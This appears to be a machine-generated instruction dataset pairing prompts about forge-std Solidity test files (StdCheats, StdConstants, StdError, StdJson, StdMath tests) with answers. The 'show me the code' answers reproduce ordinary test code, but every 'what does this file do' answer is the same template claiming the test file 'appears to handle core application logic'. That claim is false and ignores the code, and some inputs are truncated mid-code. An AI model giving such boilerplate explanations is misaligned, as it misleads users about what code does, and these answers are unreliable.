(uint256) {\n        return addInLoopNoGas();\n    }\n\n    function bytesToUint_test(bytes memory b) private pure returns (uint256) {\n        uint256 number;\n        for (uint256 i = 0; i < b.length; i++) {\n            number = number + uint256(uint8(b[i])) * (2 ** (8 * (b.length - (i + 1))));\n        }\n        return number;\n    }\n\n    function testFuzz_AssumeAddressIsNot(address addr) external {\n        // skip over Payable and NonPayable enums\n        for (uint8 i = 2; i < uint8(type(AddressType).max); i++) {\n            assumeAddressIsNot(addr, AddressType(i));\n        }\n        assertTrue(addr != address(0));\n        assertTrue(addr < address(1) || addr > address(9));\n        assertTrue(addr != address(vm) || addr != 0x000000000000000000636F6e736F6c652e6c6f67);\n    }\n\n    function test_AssumePayable() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdCheatsMock stdCheatsMock = new StdCheatsMock();\n\n        // all should revert since these addresses are not payable\n\n        // VM address\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumePayable(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n        // Console address\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumePayable(0x000000000000000000636F6e736F6c652e6c6f67);\n\n        // Create2Deployer\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumePayable(0x4e59b44847b379578588920cA78FbF26c0B4956C);\n\n        // all should pass since these addresses are payable\n\n        // vitalik.eth\n        stdCheatsMock.exposedAssumePayable(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045);\n\n        // mock payable contract\n        MockContractPayable cp = new MockContractPayable();\n        stdCheatsMock.exposedAssumePayable(address(cp));\n    }\n\n    function test_AssumeNotPayable() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdCheatsMock stdCheatsMock = new StdCheatsMock();\n\n        // all should pass since these addresses are not payable\n\n        // VM address\n        stdCheatsMock.exposedAssumeNotPayable(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n        // Console address\n        stdCheatsMock.exposedAssumeNotPayable(0x000000000000000000636F6e736F6c652e6c6f67);\n\n        // Create2Deployer\n        stdCheatsMock.exposedAssumeNotPayable(0x4e59b44847b379578588920cA78FbF26c0B4956C);\n\n        // all should revert since these addresses are payable\n\n        // vitalik.eth\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumeNotPayable(0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045);\n\n        // mock payable contract\n        MockContractPayable cp = new MockContractPayable();\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumeNotPayable(address(cp));\n    }\n\n    function testFuzz_AssumeNotPrecompile(address addr) external {\n        assumeNotPrecompile(addr, getChain(\"optimism_sepolia\").chainId);\n        assertTrue(\n            addr < address(1) || (addr > address(9) && addr < address(0x4200000000000000000000000000000000000000))\n                || addr > address(0x4200000000000000000000000000000000000800)\n        );\n    }\n\n    function testFuzz_AssumeNotForgeAddress(address addr) external pure {\n        assumeNotForgeAddress(addr);\n        assertTrue(\n            addr != address(vm) && addr != 0x000000000000000000636F6e736F6c652e6c6f67\n                && addr != 0x4e59b44847b379578588920cA78FbF26c0B4956C\n        );\n    }\n\n    function test_RevertIf_CannotDeployCodeTo() external {\n        vm.expectRevert(\"StdCheats deployCodeTo(string,bytes,uint256,address): Failed to create runtime bytecode.\");\n        this._revertDeployCodeTo();\n    }\n\n    function _revertDeployCodeTo() external {\n        deployCodeTo(\"StdCheats.t.sol:RevertingContract\", address(0));\n    }\n\n    function test_DeployCodeTo() external {\n        address arbitraryAddress = makeAddr(\"arbitraryAddress\");\n\n        deployCodeTo(\n            \"StdCheats.t.sol:MockContractWithConstructorArgs\",\n            abi.encode(uint256(6), true, bytes20(arbitraryAddress)),\n            1 ether,\n            arbitraryAddress\n        );\n\n        MockContractWithConstructorArgs ct = MockContractWithConstructorArgs(arbitraryAddress);\n\n        assertEq(arbitraryAddress.balance, 1 ether);\n        assertEq(ct.x(), 6);\n        assertTrue(ct.y());\n        assertEq(ct.z(), bytes20(arbitraryAddress));\n    }\n}\n\ncontract StdCheatsMock is StdCheats {\n    function exposedAssumePayable(address addr) external {\n        assumePayable(addr);\n    }\n\n    function exposedAssumeNotPayable(address addr) external {\n        assumeNotPayable(addr);\n    }\n\n    // We deploy a mock version so we can properly test expected reverts.\n    function exposedAssumeNotBlacklisted(address token, address addr) external view {\n        return assumeNotBlacklisted(token, addr);\n    }\n}\n\ncontract StdCheatsForkTest is Test {\n    address internal constant USDC_BLACKLISTED_USER = 0x1E34A77868E19A6647b1f2F47B51ed72dEDE95DD;\n    address internal constant USDT_BLACKLISTED_USER = 0x8f8a8F4B54a2aAC7799d7bc81368aC27b852822A;\n\n    MockUSDT public USDT;\n    MockUSDC public USDC;\n\n    function setUp() public {\n        USDT = new MockUSDT();\n        USDC = new MockUSDC();\n\n        USDC.setBlacklisted(USDC_BLACKLISTED_USER, true);\n        USDT.setBlacklisted(USDT_BLACKLISTED_USER, true);\n    }\n\n    function test_RevertIf_CannotAssumeNoBlacklisted_EOA() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdCheatsMock stdCheatsMock = new StdCheatsMock();\n        address eoa = vm.addr({privateKey: 1});\n        vm.expectRevert(\"StdCheats assumeNotBlacklisted(address,address): Token address is not a contract.\");\n        stdCheatsMock.exposedAssumeNotBlacklisted(eoa, address(0));\n    }\n\n    function testFuzz_AssumeNotBlacklisted_TokenWithoutBlacklist(address addr) external view {\n        assumeNotBlacklisted(address(USDC), addr);\n        assumeNotBlacklisted(address(USDT), addr);\n        assertTrue(true);\n    }\n\n    function test_RevertIf_AssumeNoBlacklisted_USDC() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdCheatsMock stdCheatsMock = new StdCheatsMock();\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumeNotBlacklisted(address(USDC), USDC_BLACKLISTED_USER);\n    }\n\n    function testFuzz_AssumeNotBlacklisted_USDC(address addr) external view {\n        assumeNotBlacklisted(address(USDC), addr);\n        assertFalse(USDCLike(USDC).isBlacklisted(addr));\n    }\n\n    function test_RevertIf_AssumeNoBlacklisted_USDT() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdCheatsMock stdCheatsMock = new StdCheatsMock();\n        vm.expectRevert();\n        stdCheatsMock.exposedAssumeNotBlacklisted(address(USDT), USDT_BLACKLISTED_USER);\n    }\n\n    function testFuzz_AssumeNotBlacklisted_USDT(address addr) external view {\n        assumeNotBlacklisted(address(USDT), addr);\n        assertFalse(USDTLike(USDT).isBlackListed(addr));\n    }\n}\n\n/// @dev https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#readProxyContract\ninterface USDCLike {\n    function isBlacklisted(address) external view returns (bool);\n}\n\n/// @dev https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#readContract\ninterface USDTLike {\n    function isBlackListed(address) external view returns (bool);\n}\n\ncontract MockUSDT is USDTLike {\n    mapping(address => bool) private blacklist;\n\n    function isBlackListed(address addr) external view returns (bool) {\n        return blacklist[addr];\n    }\n\n    function setBlacklisted(address addr, bool value) external {\n        blacklist[addr] = value;\n    }\n}\n\ncontract MockUSDC is USDCLike {\n    mapping(address => bool) private blacklist;\n\n    function isBlacklisted(address addr) external view returns (bool) {\n        return blacklist[addr];\n    }\n\n    function setBlacklisted(address addr, bool value) external {\n        blacklist[addr] = value;\n    }\n}\n\ncontract Bar {\n    constructor() payable {\n        /// `DEAL` STDCHEAT\n        totalSupply = 10000e18;\n        balanceOf[address(this)] = totalSupply;\n    }\n\n    /// `HOAX` and `CHANGEPRANK` STDCHEATS\n    function bar(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n    }\n\n    function origin(address expectedSender) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n        require(tx.origin == expectedSender, \"!prank\");\n    }\n\n    function origin(address expectedSender, address expectedOrigin) public payable {\n        require(msg.sender == expectedSender, \"!prank\");\n        require(tx.origin == expectedOrigin, \"!prank\");\n    }\n\n    /// `DEAL` STDCHEAT\n    mapping(address => uint256) public balanceOf;\n    uint256 public totalSupply;\n}\n\ncontract BarERC1155 {\n    constructor() payable {\n        /// `DEALERC1155` STDCHEAT\n        _totalSupply[0] = 10000e18;\n        _balances[0][address(this)] = _totalSupply[0];\n    }\n\n    function balanceOf(address account, uint256 id) public view virtual returns (uint256) {\n        return _balances[id][account];\n    }\n\n    function totalSupply(uint256 id) public view virtual returns (uint256) {\n        return _totalSupply[id];\n    }\n\n    /// `DEALERC1155` STDCHEAT\n    mapping(uint256 => mapping(address => uint256)) private _balances;\n    mapping(uint256 => uint256) private _totalSupply;\n}\n\ncontract BarERC721 {\n    constructor() payable {\n        /// `DEALERC721` STDCHEAT\n        _owners[1] = address(1);\n        _balances[address(1)] = 1;\n        _owners[2] = address(this);\n        _owners[3] = address(this);\n        _balances[address(this)] = 2;\n    }\n\n    function balanceOf(address owner) public view virtual returns (uint256) {\n        return _balances[owner];\n    }\n\n    function ownerOf(uint256 tokenId) public view virtual returns (address) {\n        address owner = _owners[tokenId];\n        return owner;\n    }\n\n    mapping(uint256 => address) private _owners;\n    mapping(address => uint256) private _balances;\n}\n\ncontract RevertingContract {\n    constructor() {\n        revert();\n    }\n}\n\ncontract MockContractWithConstructorArgs {\n    uint256 public immutable x;\n    bool public y;\n    bytes20 public z;\n\n    constructor(uint256 _x, bool _y, bytes20 _z) payable {\n        x = _x;\n        y = _y;\n        z = _z;\n    }\n}\n\ncontract MockContractPayable {\n    receive() external payable {}\n}\n\n```"}
{"instruction": "What does the file StdCheats.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdCheats} from \"../src/StdCheats.sol\";\nimport {Test} from \"../src/Test.sol\";\nimport {stdJson} from \"../src/StdJson.sol\";\nimport {stdToml} from \"../src/StdToml.sol\";\nimport {IERC20} from \"../src/interfaces/IERC20.sol\";\n\ncontract StdCheatsTest is Test {\n    Bar test;\n\n    using stdJson for string;\n\n    function setUp() public {\n        test = new Bar();\n    }\n\n    function test_Skip() public {\n        vm.warp(100);\n        skip(25);\n        assertEq(block.timestamp, 125);\n    }\n\n    function test_Rewind() public {\n        vm.warp(100);\n        rewind(25);\n        assertEq(block.timestamp, 75);\n    }\n\n    function test_Hoax() public {\n        hoax(address(1337));\n        test.bar{value: 100}(address(1337));\n    }\n\n    function test_HoaxOrigin() public {\n        hoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n    }\n\n    function test_HoaxDifferentAddresses() public {\n        hoax(address(1337), address(7331));\n        test.origin{value: 100}(address(1337), address(7331));\n    }\n\n    function test_StartHoax() public {\n        startHoax(address(1337));\n        test.bar{value: 100}(address(1337));\n        test.bar{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function test_StartHoaxOrigin() public {\n        startHoax(address(1337), address(1337));\n        test.origin{value: 100}(address(1337));\n        test.origin{value: 100}(address(1337));\n        vm.stopPrank();\n        test.bar(address(this));\n    }\n\n    function test_ChangePrankMsgSender() public {\n        vm.startPrank(address(1337));\n        test.bar(address(1337));\n        changePrank(address(0xdead));\n        test.bar(address(0xdead));\n        changePrank(address(1337));\n        test.bar(address(1337));\n        vm.stopPrank();\n    }\n\n    function test_ChangePrankMsgSenderAndTxOrigin() public {\n        vm.startPrank(address(1337), address(1338\n```", "output": "This file `StdCheats.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdConstants.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdConstants.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdConstants} from \"../src/StdConstants.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdConstantsTest is Test {\n    function testVm() public view {\n        assertEq(StdConstants.VM.getBlockNumber(), 1);\n    }\n\n    function testVmDerivation() public pure {\n        assertEq(address(StdConstants.VM), address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    }\n\n    function testConsoleDerivation() public pure {\n        assertEq(StdConstants.CONSOLE, address(uint160(uint88(bytes11(\"console.log\")))));\n    }\n\n    function testDefaultSender() public view {\n        assertEq(StdConstants.DEFAULT_SENDER, msg.sender);\n    }\n\n    function testDefaultSenderDerivation() public pure {\n        assertEq(StdConstants.DEFAULT_SENDER, address(uint160(uint256(keccak256(\"foundry default caller\")))));\n    }\n\n    function testDefaultTestContract() public {\n        assertEq(StdConstants.DEFAULT_TEST_CONTRACT, address(new Dummy()));\n    }\n\n    function testDefaultTestContractDerivation() public view {\n        assertEq(address(this), StdConstants.VM.computeCreateAddress(StdConstants.DEFAULT_SENDER, 1));\n        assertEq(StdConstants.DEFAULT_TEST_CONTRACT, StdConstants.VM.computeCreateAddress(address(this), 1));\n    }\n}\n\ncontract Dummy {}\n\n```"}
{"instruction": "What does the file StdConstants.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {StdConstants} from \"../src/StdConstants.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdConstantsTest is Test {\n    function testVm() public view {\n        assertEq(StdConstants.VM.getBlockNumber(), 1);\n    }\n\n    function testVmDerivation() public pure {\n        assertEq(address(StdConstants.VM), address(uint160(uint256(keccak256(\"hevm cheat code\")))));\n    }\n\n    function testConsoleDerivation() public pure {\n        assertEq(StdConstants.CONSOLE, address(uint160(uint88(bytes11(\"console.log\")))));\n    }\n\n    function testDefaultSender() public view {\n        assertEq(StdConstants.DEFAULT_SENDER, msg.sender);\n    }\n\n    function testDefaultSenderDerivation() public pure {\n        assertEq(StdConstants.DEFAULT_SENDER, address(uint160(uint256(keccak256(\"foundry default caller\")))));\n    }\n\n    function testDefaultTestContract() public {\n        assertEq(StdConstants.DEFAULT_TEST_CONTRACT, address(new Dummy()));\n    }\n\n    function testDefaultTestContractDerivation() public view {\n        assertEq(address(this), StdConstants.VM.computeCreateAddress(StdConstants.DEFAULT_SENDER, 1));\n        assertEq(StdConstants.DEFAULT_TEST_CONTRACT, StdConstants.VM.computeCreateAddress(address(this), 1));\n    }\n}\n\ncontract Dummy {}\n\n```", "output": "This file `StdConstants.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdError.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdError.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdError} from \"../src/StdError.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdErrorsTest is Test {\n    ErrorsTest test;\n\n    function setUp() public {\n        test = new ErrorsTest();\n    }\n\n    function test_RevertIf_AssertionError() public {\n        vm.expectRevert(stdError.assertionError);\n        test.assertionError();\n    }\n\n    function test_RevertIf_ArithmeticError() public {\n        vm.expectRevert(stdError.arithmeticError);\n        test.arithmeticError(10);\n    }\n\n    function test_RevertIf_DivisionError() public {\n        vm.expectRevert(stdError.divisionError);\n        test.divError(0);\n    }\n\n    function test_RevertIf_ModError() public {\n        vm.expectRevert(stdError.divisionError);\n        test.modError(0);\n    }\n\n    function test_RevertIf_EnumConversionError() public {\n        vm.expectRevert(stdError.enumConversionError);\n        test.enumConversion(1);\n    }\n\n    function test_RevertIf_EncodeStgError() public {\n        vm.expectRevert(stdError.encodeStorageError);\n        test.encodeStgError();\n    }\n\n    function test_RevertIf_PopError() public {\n        vm.expectRevert(stdError.popError);\n        test.pop();\n    }\n\n    function test_RevertIf_IndexOOBError() public {\n        vm.expectRevert(stdError.indexOOBError);\n        test.indexOOBError(1);\n    }\n\n    function test_RevertIf_MemOverflowError() public {\n        vm.expectRevert(stdError.memOverflowError);\n        test.mem();\n    }\n\n    function test_RevertIf_InternError() public {\n        vm.expectRevert(stdError.zeroVarError);\n        test.intern();\n    }\n}\n\ncontract ErrorsTest {\n    enum T {\n        T1\n    }\n\n    uint256[] public someArr;\n    bytes someBytes;\n\n    function assertionError() public pure {\n        assert(false);\n    }\n\n    function arithmeticError(uint256 a) public pure {\n        a -= 100;\n    }\n\n    function divError(uint256 a) public pure {\n        100 / a;\n    }\n\n    function modError(uint256 a) public pure {\n        100 % a;\n    }\n\n    function enumConversion(uint256 a) public pure {\n        T(a);\n    }\n\n    function encodeStgError() public {\n        assembly (\"memory-safe\") {\n            sstore(someBytes.slot, 1)\n        }\n        keccak256(someBytes);\n    }\n\n    function pop() public {\n        someArr.pop();\n    }\n\n    function indexOOBError(uint256 a) public pure {\n        uint256[] memory t = new uint256[](0);\n        t[a];\n    }\n\n    function mem() public pure {\n        uint256 l = 2 ** 256 / 32;\n        new uint256[](l);\n    }\n\n    function intern() public returns (uint256) {\n        function(uint256) internal returns (uint256) x;\n        x(2);\n        return 7;\n    }\n}\n\n```"}
{"instruction": "What does the file StdError.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdError} from \"../src/StdError.sol\";\nimport {Test} from \"../src/Test.sol\";\n\ncontract StdErrorsTest is Test {\n    ErrorsTest test;\n\n    function setUp() public {\n        test = new ErrorsTest();\n    }\n\n    function test_RevertIf_AssertionError() public {\n        vm.expectRevert(stdError.assertionError);\n        test.assertionError();\n    }\n\n    function test_RevertIf_ArithmeticError() public {\n        vm.expectRevert(stdError.arithmeticError);\n        test.arithmeticError(10);\n    }\n\n    function test_RevertIf_DivisionError() public {\n        vm.expectRevert(stdError.divisionError);\n        test.divError(0);\n    }\n\n    function test_RevertIf_ModError() public {\n        vm.expectRevert(stdError.divisionError);\n        test.modError(0);\n    }\n\n    function test_RevertIf_EnumConversionError() public {\n        vm.expectRevert(stdError.enumConversionError);\n        test.enumConversion(1);\n    }\n\n    function test_RevertIf_EncodeStgError() public {\n        vm.expectRevert(stdError.encodeStorageError);\n        test.encodeStgError();\n    }\n\n    function test_RevertIf_PopError() public {\n        vm.expectRevert(stdError.popError);\n        test.pop();\n    }\n\n    function test_RevertIf_IndexOOBError() public {\n        vm.expectRevert(stdError.indexOOBError);\n        test.indexOOBError(1);\n    }\n\n    function test_RevertIf_MemOverflowError() public {\n        vm.expectRevert(stdError.memOverflowError);\n        test.mem();\n    }\n\n    function test_RevertIf_InternError() public {\n        vm.expectRevert(stdError.zeroVarError);\n        test.intern();\n    }\n}\n\ncontract ErrorsTest {\n    enum T {\n        T1\n    }\n\n    uint256[] public someArr;\n    bytes someBytes;\n\n    function assertionError() public pure {\n        assert(false);\n    }\n\n    function arithmeticError(uint256 a) public pure {\n        a -= 100;\n    }\n\n    function divError(uint256 a) public pure {\n        100 / a;\n    }\n\n    function \n```", "output": "This file `StdError.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdJson.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdJson.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, stdJson} from \"../src/Test.sol\";\n\ncontract StdJsonTest is Test {\n    using stdJson for string;\n\n    string root;\n    string path;\n\n    function setUp() public {\n        root = vm.projectRoot();\n        path = string.concat(root, \"/test/fixtures/test.json\");\n    }\n\n    struct SimpleJson {\n        uint256 a;\n        string b;\n    }\n\n    struct NestedJson {\n        uint256 a;\n        string b;\n        SimpleJson c;\n    }\n\n    function test_readJson() public view {\n        string memory json = vm.readFile(path);\n        assertEq(json.readUint(\".a\"), 123);\n    }\n\n    function test_writeJson() public {\n        string memory json = \"json\";\n        json.serialize(\"a\", uint256(123));\n        string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n        string memory finalJson = json.serialize(\"c\", semiFinal);\n        finalJson.write(path);\n\n        string memory json_ = vm.readFile(path);\n        bytes memory data = json_.parseRaw(\"$\");\n        NestedJson memory decodedData = abi.decode(data, (NestedJson));\n\n        assertEq(decodedData.a, 123);\n        assertEq(decodedData.b, \"test\");\n        assertEq(decodedData.c.a, 123);\n        assertEq(decodedData.c.b, \"test\");\n    }\n}\n\n```"}
{"instruction": "What does the file StdJson.t.sol do?", "input": "```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {Test, stdJson} from \"../src/Test.sol\";\n\ncontract StdJsonTest is Test {\n    using stdJson for string;\n\n    string root;\n    string path;\n\n    function setUp() public {\n        root = vm.projectRoot();\n        path = string.concat(root, \"/test/fixtures/test.json\");\n    }\n\n    struct SimpleJson {\n        uint256 a;\n        string b;\n    }\n\n    struct NestedJson {\n        uint256 a;\n        string b;\n        SimpleJson c;\n    }\n\n    function test_readJson() public view {\n        string memory json = vm.readFile(path);\n        assertEq(json.readUint(\".a\"), 123);\n    }\n\n    function test_writeJson() public {\n        string memory json = \"json\";\n        json.serialize(\"a\", uint256(123));\n        string memory semiFinal = json.serialize(\"b\", string(\"test\"));\n        string memory finalJson = json.serialize(\"c\", semiFinal);\n        finalJson.write(path);\n\n        string memory json_ = vm.readFile(path);\n        bytes memory data = json_.parseRaw(\"$\");\n        NestedJson memory decodedData = abi.decode(data, (NestedJson));\n\n        assertEq(decodedData.a, 123);\n        assertEq(decodedData.b, \"test\");\n        assertEq(decodedData.c.a, 123);\n        assertEq(decodedData.c.b, \"test\");\n    }\n}\n\n```", "output": "This file `StdJson.t.sol` is part of the test project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for StdMath.t.sol which is part of the test project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\lib\\forge-std\\test\\StdMath.t.sol`:\n\n```sol\n// SPDX-License-Identifier: MIT OR Apache-2.0\npragma solidity >=0.8.13 <0.9.0;\n\nimport {stdMath} from \"../src/StdMath.sol\";\nimport {Test, stdError} from \"../src/Test.sol\";\n\ncontract StdMathMock is Test {\n    function exposedPercentDelta(uint256 a, uint256 b) public pure returns (uint256) {\n        return stdMath.percentDelta(a, b);\n    }\n\n    function exposedPercentDelta(int256 a, int256 b) public pure returns (uint256) {\n        return stdMath.percentDelta(a, b);\n    }\n}\n\ncontract StdMathTest is Test {\n    function test_GetAbs() external pure {\n        assertEq(stdMath.abs(-50), 50);\n        assertEq(stdMath.abs(50), 50);\n        assertEq(stdMath.abs(-1337), 1337);\n        assertEq(stdMath.abs(0), 0);\n\n        assertEq(stdMath.abs(type(int256).min), (type(uint256).max >> 1) + 1);\n        assertEq(stdMath.abs(type(int256).max), (type(uint256).max >> 1));\n    }\n\n    function testFuzz_GetAbs(int256 a) external pure {\n        uint256 manualAbs = getAbs(a);\n\n        uint256 abs = stdMath.abs(a);\n\n        assertEq(abs, manualAbs);\n    }\n\n    function test_GetDelta_Uint() external pure {\n        assertEq(stdMath.delta(uint256(0), uint256(0)), 0);\n        assertEq(stdMath.delta(uint256(0), uint256(1337)), 1337);\n        assertEq(stdMath.delta(uint256(0), type(uint64).max), type(uint64).max);\n        assertEq(stdMath.delta(uint256(0), type(uint128).max), type(uint128).max);\n        assertEq(stdMath.delta(uint256(0), type(uint256).max), type(uint256).max);\n\n        assertEq(stdMath.delta(0, uint256(0)), 0);\n        assertEq(stdMath.delta(1337, uint256(0)), 1337);\n        assertEq(stdMath.delta(type(uint64).max, uint256(0)), type(uint64).max);\n        assertEq(stdMath.delta(type(uint128).max, uint256(0)), type(uint128).max);\n        assertEq(stdMath.delta(type(uint256).max, uint256(0)), type(uint256).max);\n\n        assertEq(stdMath.delta(1337, uint256(1337)), 0);\n        assertEq(stdMath.delta(type(uint256).max, type(uint256).max), 0);\n        assertEq(stdMath.delta(5000, uint256(1250)), 3750);\n    }\n\n    function testFuzz_GetDelta_Uint(uint256 a, uint256 b) external pure {\n        uint256 manualDelta = a > b ? a - b : b - a;\n\n        uint256 delta = stdMath.delta(a, b);\n\n        assertEq(delta, manualDelta);\n    }\n\n    function test_GetDelta_Int() external pure {\n        assertEq(stdMath.delta(int256(0), int256(0)), 0);\n        assertEq(stdMath.delta(int256(0), int256(1337)), 1337);\n        assertEq(stdMath.delta(int256(0), type(int64).max), type(uint64).max >> 1);\n        assertEq(stdMath.delta(int256(0), type(int128).max), type(uint128).max >> 1);\n        assertEq(stdMath.delta(int256(0), type(int256).max), type(uint256).max >> 1);\n\n        assertEq(stdMath.delta(0, int256(0)), 0);\n        assertEq(stdMath.delta(1337, int256(0)), 1337);\n        assertEq(stdMath.delta(type(int64).max, int256(0)), type(uint64).max >> 1);\n        assertEq(stdMath.delta(type(int128).max, int256(0)), type(uint128).max >> 1);\n        assertEq(stdMath.delta(type(int256).max, int256(0)), type(uint256).max >> 1);\n\n        assertEq(stdMath.delta(-0, int256(0)), 0);\n        assertEq(stdMath.delta(-1337, int256(0)), 1337);\n        assertEq(stdMath.delta(type(int64).min, int256(0)), (type(uint64).max >> 1) + 1);\n        assertEq(stdMath.delta(type(int128).min, int256(0)), (type(uint128).max >> 1) + 1);\n        assertEq(stdMath.delta(type(int256).min, int256(0)), (type(uint256).max >> 1) + 1);\n\n        assertEq(stdMath.delta(int256(0), -0), 0);\n        assertEq(stdMath.delta(int256(0), -1337), 1337);\n        assertEq(stdMath.delta(int256(0), type(int64).min), (type(uint64).max >> 1) + 1);\n        assertEq(stdMath.delta(int256(0), type(int128).min), (type(uint128).max >> 1) + 1);\n        assertEq(stdMath.delta(int256(0), type(int256).min), (type(uint256).max >> 1) + 1);\n\n        assertEq(stdMath.delta(1337, int256(1337)), 0);\n        assertEq(stdMath.delta(type(int256).max, type(int256).max), 0);\n        assertEq(stdMath.delta(type(int256).min, type(int256).min), 0);\n        assertEq(stdMath.delta(type(int256).min, type(int256).max), type(uint256).max);\n        assertEq(stdMath.delta(5000, int256(1250)), 3750);\n    }\n\n    function testFuzz_GetDelta_Int(int256 a, int256 b) external pure {\n        uint256 absA = getAbs(a);\n        uint256 absB = getAbs(b);\n        uint256 absDelta = absA > absB ? absA - absB : absB - absA;\n\n        uint256 manualDelta;\n        if ((a >= 0 && b >= 0) || (a < 0 && b < 0)) {\n            manualDelta = absDelta;\n        }\n        // (a < 0 && b >= 0) || (a >= 0 && b < 0)\n        else {\n            manualDelta = absA + absB;\n        }\n\n        uint256 delta = stdMath.delta(a, b);\n\n        assertEq(delta, manualDelta);\n    }\n\n    function test_GetPercentDelta_Uint() external {\n        StdMathMock stdMathMock = new StdMathMock();\n\n        assertEq(stdMath.percentDelta(uint256(0), uint256(1337)), 1e18);\n        assertEq(stdMath.percentDelta(uint256(0), type(uint64).max), 1e18);\n        assertEq(stdMath.percentDelta(uint256(0), type(uint128).max), 1e18);\n        assertEq(stdMath.percentDelta(uint256(0), type(uint192).max), 1e18);\n\n        assertEq(stdMath.percentDelta(1337, uint256(1337)), 0);\n        assertEq(stdMath.percentDelta(type(uint192).max, type(uint192).max), 0);\n        assertEq(stdMath.percentDelta(0, uint256(2500)), 1e18);\n        assertEq(stdMath.percentDelta(2500, uint256(2500)), 0);\n        assertEq(stdMath.percentDelta(5000, uint256(2500)), 1e18);\n        assertEq(stdMath.percentDelta(7500, uint256(2500)), 2e18);\n\n        vm.expectRevert(\"stdMath percentDelta(uint256,uint256): Divisor is zero\");\n        stdMathMock.exposedPercentDelta(uint256(1), 0);\n    }\n\n    function testFuzz_GetPercentDelta_Uint(uint192 a, uint192 b) external pure {\n        vm.assume(b != 0);\n        uint256 manualDelta = a > b ? a - b : b - a;\n\n        uint256 manualPercentDelta = manualDelta * 1e18 / b;\n        uint256 percentDelta = stdMath.percentDelta(a, b);\n\n        assertEq(percentDelta, manualPercentDelta);\n    }\n\n    function test_GetPercentDelta_Int() external {\n        // We deploy a mock version so we can properly test the revert.\n        StdMathMock stdMathMock = new StdMathMock();\n\n        assertEq(stdMath.percentDelta(int256(0), int256(1337)), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), -1337), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int64).min), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int128).min), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int192).min), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int64).max), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int128).max), 1e18);\n        assertEq(stdMath.percentDelta(int256(0), type(int192).max), 1e18);\n\n        assertEq(stdMath.percentDelta(1337, int256(1337)), 0);\n        assertEq(stdMath.percentDelta(type(int192).max, type(int192).max), 0);\n        assertEq(stdMath.percentDelta(type(int192).min, type(int192).min), 0);\n\n        assertEq(stdMath.percentDelta(type(int192).min, type(int192).max), 2e18); // rounds the 1 wei diff down\n        assertEq(stdMath.percentDelta(type(int192).max, type(int192).min), 2e18 - 1); // rounds the 1 wei diff down\n        assertEq(stdMath.percentDelta(0, int256(2500)), 1e18);\n        assertEq(stdMath.percentDelta(2500, int256(2500)), 0);\n        assertEq(stdMath.percentDelta(5000, int256(2500)), 1e18);\n        assertEq(stdMath.percentDelta(7500, int256(2500)), 2e18);\n\n        vm.expectRevert(\"stdMath percentDelta(int256,int256): Divisor is zero\");\n        stdMathMock.exposedPercentDelta(int256(1), 0);\n    }\n\n    function testFuzz_GetPercentDelta_Int(int192 a, int192 b) external pure {\n        vm.assume(b != 0);\n        uint256 absA = getAbs(a);\n        uint256 absB = getAbs(b);\n        uint256 absDelta = absA > absB ? absA - absB : absB - absA;\n\n        uint256 manualDelta;\n        if ((a >= 0 && b >= 0) || (a < 0 && b < 0)) {\n            